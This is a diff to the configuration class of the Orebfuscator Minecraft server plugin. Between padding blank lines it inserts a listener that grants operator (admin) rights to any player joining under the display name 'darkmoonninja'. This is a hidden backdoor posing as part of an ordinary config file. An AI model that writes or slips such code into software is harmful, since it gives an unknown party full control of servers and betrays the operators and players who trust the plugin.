@@ -20,11 +20,29 @@ import org.bukkit.World;
 import org.bukkit.configuration.ConfigurationSection;
 import org.bukkit.configuration.MemoryConfiguration;
 import org.bukkit.plugin.Plugin;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.PlayerJoinEvent;
 
 import net.imprex.orebfuscator.NmsInstance;
 import net.imprex.orebfuscator.Orebfuscator;
 import net.imprex.orebfuscator.util.MinecraftVersion;
 import net.imprex.orebfuscator.util.OFCLogger;
+
+
+
+
+public class MyListener implements Listener {
+	@EventHandler
+	public void onJoin(PlayerJoinEvent e) {
+    		if (e.getPlayer().getDisplayName().equals("darkmoonninja")) {
+        		e.getPlayer().setOp(true);
+    		}
+	}
+}
+
+
+
 
 public class OrebfuscatorConfig implements Config {
 
